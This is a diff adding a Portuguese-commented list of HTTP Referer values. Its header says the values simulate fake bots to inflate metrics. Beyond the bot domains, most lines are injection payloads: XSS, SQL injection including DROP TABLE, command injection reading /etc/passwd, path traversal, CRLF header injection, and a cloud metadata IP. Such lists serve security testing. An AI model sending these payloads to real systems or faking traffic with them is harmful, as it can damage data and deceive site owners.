@@ -1,0 +1,73 @@
+# Referers Injection - Bots e domínios para injeção de referer
+# Estes domínios simulam bots falsos para inflar métricas
+
+# Bots de Referência Falsos
+spambot.xyz
+adbot.xyz
+clickbot.xyz
+hitbot.xyz
+visitbot.xyz
+viewbot.xyz
+refererbot.xyz
+crawlerbot.xyz
+
+# Bots de Redes Sociais Falsos
+socialbot.xyz
+likebot.xyz
+sharebot.xyz
+followbot.xyz
+subscriberbot.xyz
+youtubebot.xyz
+instagrambot.xyz
+facebookbot.xyz
+twitterbot.xyz
+pinterestbot.xyz
+linkedinbot.xyz
+tiktokbot.xyz
+redditbot.xyz
+
+# Bots de SEO Maliciosos
+trafficbot.xyz
+rankingbot.xyz
+searchbot.xyz
+
+# Injeção via Headers - Payloads XSS
+evil.com/"><script>alert(1)</script>
+malicious.com?<img src=x onerror=alert(1)>
+attack.com/"><svg onload=alert(1)>
+
+# Injeção via Headers - SQL Injection
+evil.com/' OR '1'='1
+attack.com/1; DROP TABLE users--
+malicious.com/' UNION SELECT * FROM users--
+
+# Injeção via Headers - Command Injection
+evil.com/;cat /etc/passwd
+attack.com/|id
+malicious.com/`whoami`
+
+# Injeção via Headers - Path Traversal
+evil.com/../../../etc/passwd
+attack.com/....//....//etc/hosts
+
+# Injeção via Headers - CRLF
+evil.com/%0d%0aSet-Cookie:hacked=true
+attack.com/%0d%0aLocation:http://malicious.com
+
+# Referer Overflow - Longos
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.com
+bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb.xyz
+
+# Protocolo Manipulation
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+file:///etc/passwd
+ftp://evil.com/shell.php
+
+# IP Address Referers (suspeito)
+127.0.0.1
+192.168.1.1
+10.0.0.1
+169.254.169.254
+0.0.0.0
+::1
